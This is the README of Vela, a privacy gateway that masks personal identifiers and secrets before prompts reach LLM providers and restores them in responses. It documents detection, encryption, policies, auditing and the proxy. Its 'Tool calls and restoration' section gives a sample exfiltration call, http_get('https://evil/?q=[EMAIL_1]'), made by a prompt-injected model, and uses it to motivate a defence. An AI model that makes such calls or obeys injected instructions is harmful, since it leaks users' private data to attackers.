# Vela — LLM Privacy Gateway

<p align="center">
  <strong>Mask PII before it reaches any LLM, restore it in the response. Built by Dharmabot AI.</strong>
</p>

<p align="center">
  <a href="https://www.npmjs.com/package/vela-privacy"><img src="https://img.shields.io/npm/v/vela-privacy.svg?style=flat-square&color=blue" alt="npm version" /></a>
  <a href="https://github.com/AdvRahulAR/Vela"><img src="https://img.shields.io/badge/license-MIT-green.svg?style=flat-square" alt="license" /></a>
  <a href="https://csrc.nist.gov/pubs/sp/800/38/g/r1/final"><img src="https://img.shields.io/badge/FPE-NIST%20FF1%20(SP%20800--38G)%20test--vector%20verified-orange.svg?style=flat-square" alt="NIST SP 800-38G" /></a>
</p>

---

## Why Vela?

Plain redaction (`[REDACTED]`) destroys the structure an LLM needs to reason about identifiers. Vela keeps it:

- **Structured IDs** (Aadhaar, PAN, GSTIN, cards, phones, IBAN, SSN, IPs, bank accounts…) are encrypted with **NIST FF1 format-preserving encryption**. The result has the same length, separators and character classes, **and is still structurally valid**: Aadhaar passes Verhoeff, cards pass Luhn and keep their brand digit, GSTINs get a valid check character, IBANs get valid check digits, phones keep their country code.
- **Everything else** (names, emails, addresses, dates of birth, UPI IDs, secrets, your own glossary terms) becomes a readable, reversible placeholder like `[PERSON_1]` or `[EMAIL_2]`.
- **Fail-closed:** if a detected value can't be format-preserved safely, it becomes a placeholder. Anything *detected* is never passed through (detection itself is pattern- and heuristic-based, so check the table below for what is and isn't covered).
- **Restoration is tolerant:** if the model reformats a value (drops spaces, changes case, writes `EMAIL_1` without brackets), Vela still restores it. It also works mid-stream.

```
Rahul Sharma (PAN ABCDE1234F, Aadhaar 2345 6789 0124, +91 98765 43210, rahul@company.com) leads ProjectApollo.
            ↓
[PERSON_1] (PAN SDUDJ8635F, Aadhaar 5096 7654 3028, +91 85254 01919, [EMAIL_1]) leads [CUSTOM_1].
```

| | Naive redaction | Vela |
|---|:---:|:---:|
| Structured IDs | `[REDACTED]` | Valid-looking FF1 ciphertext (checksums recomputed) |
| Soft PII | `[REDACTED]` | `[PERSON_1]`, `[EMAIL_2]` (reversible, JSON-safe) |
| Multi-message requests | — | One session per request → unique placeholders across all messages |
| Streaming | — | Per-choice / per-tool-call / per-content-block chunk-aware restoration |
| Providers | — | OpenAI Chat Completions, OpenAI Responses, Anthropic Messages |
| Surfaces | — | SDK, OpenAI & Anthropic client wrappers, fetch interceptor, Express, standalone proxy, CLI |

## Project status

Vela is **pre-1.0 and has not yet been independently security-reviewed**. What that means in practice:

- **The encryption and restoration are well tested.** FF1 matches NIST's official vectors, and every release passes property-based tests (round-trip, no leakage, checksum validity, streaming), a labelled detection corpus and a regex denial-of-service guard on Node 22 and 24.
- **Detection without NER is best-effort.** Structured identifiers are found reliably. Names and addresses are found by heuristics and are missed in Indian scripts, for rare names and in free-form addresses. [docs/DETECTION_REPORT.md](docs/DETECTION_REPORT.md) gives per-type recall with 95% confidence intervals on a 2,400-entity synthetic corpus: 86.6% for names, nearly all misses in Indic scripts. Read it as an upper bound. The hand-labelled corpus (`npm run eval`) lists the harder misses.
- **Recommended production setup:** the proxy or a client wrapper, a policy (start from a preset), an audit sink, a [Presidio NER service](examples/presidio/README.md) with `recognizerFailure: 'block'` (the default), and a `sessionId` per conversation. See [Compliance controls](#compliance-controls) and the [compliance audit](docs/COMPLIANCE_AUDIT.md).
- Read the [threat model](docs/THREAT_MODEL.md) for what Vela does and does not protect against, and [SECURITY.md](SECURITY.md) to report a vulnerability.

---

## Installation

```bash
npm install vela-privacy
```

Node.js ≥ 22. Ships ESM and CommonJS.

---

## Quick start

```typescript
import { Vela } from 'vela-privacy';

const vela = new Vela({ glossary: ['ProjectApollo'] }); // random key per process

const session = vela.createSession();
const masked = session.mask('Rahul Sharma, PAN ABCDE1234F, works on ProjectApollo');
// "[PERSON_1], PAN SDUDJ8635F, works on [CUSTOM_1]"

const reply = '[PERSON_1] (PAN SDUDJ8635F) is cleared for [CUSTOM_1].'; // from the LLM
session.unmask(reply).text;
// "Rahul Sharma (PAN ABCDE1234F) is cleared for ProjectApollo."
```

`vela.mask(text)` / `vela.unmask(text, result)` still work as one-shot helpers.

### Sessions and `sessionId`

Every value masked within one session gets one consistent placeholder, so a multi-message request never reuses `[EMAIL_1]` for two different people.

- **No `sessionId` (default):** each session uses a random tweak, so the same Aadhaar masks differently in every session and nobody can link users across requests.
- **`createSession({ sessionId: conversationId })`:** values mask identically for every request in that conversation. Use this when the provider keeps conversation state server-side (`previous_response_id`, Assistants) or when you rely on prompt caching. Through the proxy, fetch interceptor or Express middleware, send an `x-vela-session: <id>` header instead. Vela strips it before the request goes upstream.

---

## Integrations

### OpenAI client (Chat Completions + Responses, sync + streaming)

```typescript
import OpenAI from 'openai';
import { Vela, wrapOpenAiClient } from 'vela-privacy';

const openai = wrapOpenAiClient(new OpenAI(), new Vela(), {
  sessionId: (params) => params.metadata?.conversation_id, // optional
});

await openai.chat.completions.create({ model: 'gpt-4o', messages, stream: true });
await openai.responses.create({ model: 'gpt-4o', input: 'Audit PAN ABCDE1234F' });
```

Wrapped requests mask system/user/assistant/tool messages, text parts and tool-call arguments. Arguments are parsed as JSON, so they stay valid JSON, and key names act as hints: `{"customer_name": "…"}` is treated as a name. Responses are restored everywhere, including streamed tool-call arguments.

### Anthropic client

```typescript
import Anthropic from '@anthropic-ai/sdk';
import { Vela, wrapAnthropicClient } from 'vela-privacy';

const anthropic = wrapAnthropicClient(new Anthropic(), new Vela());
await anthropic.messages.create({ model: 'claude-sonnet-4-5', system: '…', messages, max_tokens: 1024, stream: true });
```

Covers `system` (string or blocks), text blocks, `tool_use.input`, `tool_result` content and plain-text documents. Streaming handles `text_delta`, `thinking_delta` and `input_json_delta`. Use `create({ stream: true })`: the `messages.stream()` helper throws `VelaRouteBlockedError`. `messages.countTokens` is masked; `messages.batches.create` is blocked.

### Global fetch interceptor

```typescript
import { Vela, createFetchInterceptor } from 'vela-privacy';
globalThis.fetch = createFetchInterceptor(new Vela(), { providers: ['openai', 'anthropic'] });
```

Intercepts `POST …/chat/completions`, `…/responses` and `…/messages`, including calls made with a `Request` object, and restores JSON and SSE responses.

### Express / Connect middleware

```typescript
app.use(createExpressMiddleware(new Vela(), { upstream: 'https://api.openai.com', apiKey: process.env.OPENAI_API_KEY }));
```

Works with or without `express.json()`. Query strings and provider headers (`anthropic-version`, `openai-organization`, …) are forwarded. `apiKey` is sent as `x-api-key` for Anthropic and as `Authorization: Bearer` otherwise.

### Standalone proxy & CLI

```bash
npx vela-privacy proxy --port 8787                 # binds to 127.0.0.1 only
npx vela-privacy proxy --host 0.0.0.0 --api-key $OPENAI_API_KEY   # expose deliberately
npx vela-privacy mask "My PAN is ABCDE1234F and email is test@domain.com"
npx vela-privacy keygen                            # random 32-byte FPE key (hex)
npx vela-privacy keygen --kem                      # full ML-KEM-768 keypair (JSON)
```

Point `OPENAI_BASE_URL=http://127.0.0.1:8787/v1` (or the Anthropic SDK's `baseURL=http://127.0.0.1:8787`) at it. If you don't pass `--upstream`, Anthropic paths go to `api.anthropic.com` and everything else goes to `api.openai.com`.

**Routes:** `/chat/completions`, `/responses` (and `/responses/input_tokens`), `/messages` (and `/messages/count_tokens`) are masked and restored. `/embeddings` and `/moderations` input and legacy `/completions` prompts are masked too. Body-free requests such as `GET /v1/models` are forwarded. **Any other route that carries a body (Message Batches, `/batches`, `/files`, audio, Assistants threads, unknown endpoints) is rejected with HTTP 403 and nothing is sent**, because Vela can't mask it. `--passthrough none` also returns 404 for body-free routes; `--passthrough all` forwards unknown routes *unmasked* and is only for operators who accept that.

The client wrappers and fetch interceptor follow the same rule: methods such as `messages.countTokens`, `embeddings.create` and `responses.parse` are masked, while `batches.create`, `files.create` and the `stream()` helpers throw `VelaRouteBlockedError` instead of sending unmasked text.

---

## What is detected

| Entity | Detection | Masking |
|---|---|:---:|
| Aadhaar | 12 digits + **Verhoeff** check | FF1, valid Verhoeff output |
| PAN | `AAAAA9999A` (upper or lower case) | FF1, holder-type letter kept |
| GSTIN | structure + state code | FF1, embedded PAN matches masked PAN, valid check char |
| IFSC | `AAAA0XXXXXX` | FF1 on branch code |
| Passport | letter + 7 digits / alnum, after "passport" | FF1 |
| Bank account | 9–18 digits after "a/c", "account", "bank"… | FF1 |
| UPI ID | `name@bank` | placeholder |
| Voter ID (EPIC) | 3 letters + 7 digits, after "voter" / "EPIC" / "election" | placeholder |
| Driving licence | state + RTO + year + 7-digit serial (`KL07 20110012345`) | placeholder |
| Credit / debit card | 13–19 digits + **Luhn** | FF1, brand digit kept, valid Luhn |
| IBAN | compact or spaced + **mod-97** | FF1, valid check digits |
| Phone | Indian mobile/landline, E.164 international, North American | FF1, country code kept |
| SSN (US) | `###-##-####` (valid ranges) or 9 digits after "SSN" | FF1, valid ranges |
| IP address | IPv4, IPv6 | FF1 (IPv4) / placeholder (IPv6) |
| MAC address | `00:1A:2B:3C:4D:5E`, `00-1A-…`, Cisco `001a.2b3c.4d5e` | placeholder |
| Email | including internationalised addresses (Devanagari, CJK, accented) | placeholder |
| Person name | honorifics, "my name is…", role labels (client, petitioner…), sign-offs, first-name gazetteer (also all-lowercase: `rahul sharma called`), later mentions of a detected name (`Mr. Sharma`, `SHARMA`, `sharma`). A partial mention (`Joseph` after `Joseph Mathew`) gets the full name's placeholder and is restored as the full name (`linkPartialNames: false` on the session turns this off) | placeholder |
| Address | "Address: …" fields, street addresses with Indian/Western road suffixes, sectors, PIN/ZIP | placeholder |
| Date of birth | dates after "DOB", "born on"… | placeholder |
| PIN / ZIP code | after "PIN", "pincode", "zip" | placeholder |
| Organisation | names ending Pvt Ltd / Ltd / LLP / Inc / LLC / GmbH… | placeholder |
| Secrets | OpenAI, Anthropic, GitHub, AWS access + secret keys, Google, Stripe, Slack keys, private-key blocks, JWTs, `password=` / `api_key:` / `token=` values (also as JSON fields) | placeholder |
| Custom glossary | your terms, case-insensitive | placeholder |

**Precision guards:**
- A bare 10-digit number is not treated as a phone after "order", "invoice", "txn", "ref", "id", "₹"…
- Version strings (`v1.2.3.4`, `version 1.2.3.4`, `upgraded to 2.0.1.3`) are not IP addresses.
- A name found only through the gazetteer needs a surname, unless the first name can't be mistaken for an English word ("Will", "May", "Sunny" can). An all-lowercase name additionally needs 4+ letters and must not be an ordinary English or Hindi word (`harsh`, `vikas`, `deepak`), unless it follows a cue such as "my name is".
- Checksum-failing Aadhaar, card and IBAN numbers are skipped (turn off with `validateChecksums: false`).
- Party names in **reported court citations** are left alone: `State of Kerala v. Rahul Sharma (2019) 3 SCC 123`, `… AIR 2020 Ker 55`, `… 2021 SCC OnLine Ker 99`, and references such as `in X v. Y (supra)`. A case title without a reporter citation (`Rahul Sharma v. Priya Menon`, your client's own matter) is still masked. Set `maskCitationParties: true` to mask citations too.

**Name detection is heuristic, not a trained NER model.** For higher recall, plug in your own recognizer (spaCy, Presidio, compromise, wink-nlp…):

```typescript
new Vela({
  recognizers: [(text) => myNer(text).map((e) => ({ type: 'PERSON', start: e.start, end: e.end }))],
});
```

**Custom detectors and types.** Anything a `customDetectors` regex or a recognizer returns is masked, whatever its `type`. A type that is not built in (`EMP_ID`, `CASE_REF`…) becomes a placeholder such as `[EMP_ID_1]` with no further configuration; list it in `fpeTypes` if you want format-preserving encryption instead. `fpeTypes` / `tokenTypes` only govern the **built-in** types, and when set they *replace* the default lists rather than extending them, so a built-in type left out of both is detected but passed through in clear text.

```typescript
new Vela({
  customDetectors: [{ name: 'employee-id', type: 'EMP_ID', regex: /EMP-\d{5}/g }],
});
// "Employee EMP-12345" -> "Employee [EMP_ID_1]"
```

### NER services (async recognizers)

Real NER models usually run as a service, so Vela also accepts **async, batched recognizers**. They run once per request, before masking. A ready-made adapter for [Microsoft Presidio](examples/presidio/README.md) is included:

```typescript
import { Vela, presidioRecognizer } from 'vela-privacy';

const vela = new Vela({
  asyncRecognizers: [presidioRecognizer({ url: 'http://localhost:5002' })],
  recognizerFailure: 'block',   // default: Presidio down => request rejected (HTTP 503), nothing sent
  recognizerTimeoutMs: 5000,    // default
});

await vela.maskAsync('Thiruvenkatam called');      // or let the proxy / wrappers / fetch interceptor do it
```

- The proxy, fetch interceptor, Express middleware and client wrappers run async recognizers automatically. CLI: `vela proxy --presidio-url http://localhost:5002`.
- If you mask requests yourself, use `maskAsync()` or the `*Async` helpers (`maskOpenAiRequestAsync`, `maskAnthropicRequestAsync`, `maskOpenAiResponsesRequestAsync`). Synchronous `mask()` throws `VelaNotPreparedError` while async recognizers are configured, so no text can skip NER by accident.
- Your own recognizer is a function `(texts: string[], signal: AbortSignal) => Promise<RecognizedSpan[][]>` returning one span list per input text, with JavaScript (UTF-16) offsets.

---

## Compliance controls

Vela is built to be shown to an auditor, not just switched on. Everything below works in the library, the client wrappers, the fetch interceptor and the proxy.

### Policies

A policy is a versioned JSON or YAML file that your DPO or compliance team can review. It sets what happens to each entity type, which providers and models requests may go to, whether images and files may leave, and which response fields get real values back. Typos are errors, not silently ignored.

```yaml
# vela.policy.yaml
id: acme-bank-assistant
version: 3
packs: [pci, india-bfsi]
entities:
  CREDIT_CARD: block        # reject the request (HTTP 422), send nothing
  CARD_CVV: block
  AADHAAR: fpe-synthetic    # structure kept, check digit deliberately invalid
  DATE_OF_BIRTH: redact     # placeholder that is never restored
  ORG: allow                # left in clear text
providers: { allow: ["*.openai.azure.com"] }
models: { allow: ["gpt-4.1*"] }
nonText: block              # images, audio, files
restore: { toolArguments: placeholders }
ner: { required: true }
```

```typescript
import { Vela, loadPolicy } from 'vela-privacy';
const vela = new Vela({ policy: loadPolicy('vela.policy.yaml') });
```

```bash
npx vela-privacy proxy --policy vela.policy.yaml   # or a preset: --policy india-bfsi
npx vela-privacy policy india-bfsi                 # print a preset with its hash
```

Actions are `fpe`, `fpe-synthetic`, `token`, `redact`, `block` and `allow`. Presets (`vela policies`) are starting points: `dpdp-baseline`, `india-bfsi`, `pci`, `hipaa-safe-harbor` and `gdpr-pseudonymise`. The JSON Schema in `schemas/vela-policy.schema.json` gives editors validation and completion. See [examples/policies/bank.yaml](examples/policies/bank.yaml).

### Audit trail

```typescript
import { Vela, jsonlFileSink } from 'vela-privacy';
const vela = new Vela({ policy, audit: jsonlFileSink('/var/log/vela/audit.jsonl') });
```

- **Two events per request.** A `vela.request` event is written before anything is sent, and a `vela.response` event when the response completes. Each records:
  - the request id (also returned as `x-vela-request-id`), route, model and tenant;
  - entity counts by type and actions taken;
  - NER status, restore counts per field;
  - policy id and hash, key id, latency.
- **Rejected requests** are recorded as `vela.blocked`.
- **No values ever.** Events never contain values, hashes of values or placeholders.
- **Fails closed.** If the sink can't write before forwarding, the request is rejected (HTTP 503) and nothing is sent.
- **Tamper-evident.** `jsonlFileSink` hash-chains the events, so an edited, inserted or deleted line is detected: `npx vela-privacy audit verify audit.jsonl`.
- **Where to keep it.** If you are subject to CERT-In's directions, keep the log in India for 180 days.

### Tool calls and restoration

A prompt-injected model can put a placeholder into a tool call (`http_get("https://evil/?q=[EMAIL_1]")`), and restoring it would send the real value out through the tool. With `restore: { toolArguments: 'placeholders' }` (all presets set it), tool-call arguments keep their placeholders while content is restored. `session.restoreReport` and the audit event show how many placeholders were restored or kept in each field.

### Detector packs

Opt-in detectors for regulated data, each with positive and negative test cases:

| Pack | Entities |
|---|---|
| `pci` | CVV/CVC, card expiry, magnetic-stripe track data |
| `india-bfsi` | CKYC, UAN, demat BO ID, CIN, DIN, TAN, LEI, MICR, SWIFT/BIC, vehicle registration |
| `health-in` | ABHA number and address, MRN/UHID |
| `us` | ITIN, EIN, ABA routing, Medicare MBI |
| `eu-uk` | UK NINO, NHS number, Spanish DNI/NIE, Italian codice fiscale, German Steuer-ID, French NIR |
| `intl` | Singapore NRIC/FIN, Emirates ID, Brazilian CPF, Canadian SIN, Australian TFN |

`new Vela({ packs: ['pci', 'india-bfsi'] })`, `--packs pci,india-bfsi`, or `packs:` in a policy.

### Synthetic-safe identifiers

By default, format-preserved Aadhaar, card, GSTIN and IBAN values pass their checksums, so a masked value could be a real third party's identifier and will trip DLP tools. The `fpe-synthetic` action keeps the structure but makes the check character invalid; types with no check character (PAN, phone) fall back to a placeholder.

### Keys

```typescript
import { Vela, awsKmsKeyProvider } from 'vela-privacy';
import { KMSClient, DecryptCommand } from '@aws-sdk/client-kms';

const vela = await Vela.create({
  keyProvider: awsKmsKeyProvider({ kms: new KMSClient({}), DecryptCommand, ciphertextBlob, kmsKeyId: 'alias/vela' }),
});
```

- **Providers.** Adapters exist for AWS KMS, Azure Key Vault, Google Cloud KMS and HashiCorp Vault transit, plus `envKeyProvider` and a generic `envelopeKeyProvider`.
- **No extra dependencies.** You pass your own SDK client, so Vela adds nothing to your install.
- **Audit.** The key id goes into audit events.
- **Rotation.** Restoration uses per-request maps, so rotating a key is just a restart.

### Proxy hardening

- **Authentication.** `--auth-token-file tokens.txt` takes one `<tenant> <token>` per line. Clients send `x-vela-key: <token>`.
- **Tenants.** The tenant is recorded in audit events and bound into `x-vela-session`, so one tenant can't reproduce another's ciphertexts.
- **Exposure.** The proxy refuses a non-loopback `--host` without tokens, unless you pass `--insecure`.
- **Rate limits and TLS.** `--rate-limit <n>` caps requests per minute. `--tls-cert` and `--tls-key` serve HTTPS.

---

## Benchmarks

Node.js 22, 1,000 iterations on a realistic prompt containing 7 entities:

```
Masking:       ~1.1 ms / op   (detection + FF1 + placeholders)
Unmasking:     ~0.05 ms / op
ML-KEM-768:    ~1.7 ms / keygen + encapsulate
```

Run `npm run benchmark` to reproduce.

---

## Security notes

1. **FF1 (NIST SP 800-38G Rev. 1)** is implemented in-house and verified against all nine official NIST FF1 sample vectors (`tests/ff1.test.ts`). Values are encrypted as mixed-radix integers with cycle-walking, which keeps the mapping a bijection. Domains smaller than NIST's 10⁶ minimum are never encrypted; they get a placeholder instead.
2. **Tweaks** are derived per session and per entity type, so ciphertexts can't be linked across sessions (unless you choose a shared `sessionId`) or across entity types.
3. **Keys:** with no `fpeKey`, Vela uses a random 32-byte key per process. That's enough, because restoration uses the per-session map rather than decryption. Pass a fixed key (`vela keygen`) only if several processes must produce identical ciphertexts for the same `sessionId`.
4. **Post-quantum key distribution (optional):** `QuantumKeyManager` uses ML-KEM-768 (FIPS 203) plus HKDF-SHA256 to agree on a shared FPE key between services, and seals keys in transit with AES-256-GCM. The sealing key gets its own HKDF label, and optional AAD is supported. The masking itself is symmetric AES-based FF1, which is not vulnerable to known quantum attacks at 256 bits.
5. **The proxy listens on loopback by default** and refuses to listen beyond it without client tokens (`--auth-token-file`) unless you pass `--insecure`.
6. **Logging** records entity counts and timings only, never values.
7. **Input limits and NER failures fail closed.** Text longer than `maxInputChars` is rejected (HTTP 413), and a failed or timed-out async recognizer rejects the request (HTTP 503) unless you opt into `recognizerFailure: 'continue'`. In both cases nothing is sent upstream.

See [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md) for the full list of guarantees and non-guarantees, and [docs/REVIEW_GUIDE.md](docs/REVIEW_GUIDE.md) for security reviewers.

## Upgrading from 0.2.x

- Placeholders changed from `<PII type="EMAIL" id="0"/>` to `[EMAIL_1]`. The new form is JSON-safe and numbered per type, starting at 1.
- `CASE_ID` detection was removed.
- Without a `sessionId`, masking is no longer deterministic across calls. Use `createSession({ sessionId })` for stable output.
- FF1 ciphertexts differ from 0.2.x, which used `ff1-js` (not NIST-conformant). The `ff1-js` dependency was removed.
- `sealFpeKey` / `unsealFpeKey` now derive a dedicated sealing key, so blobs sealed by 0.2.x can't be unsealed by 0.3.
- The proxy binds to `127.0.0.1` (use `--host` to change).

---

## License

MIT © [Dharmabot AI](https://dharmabot.ai)
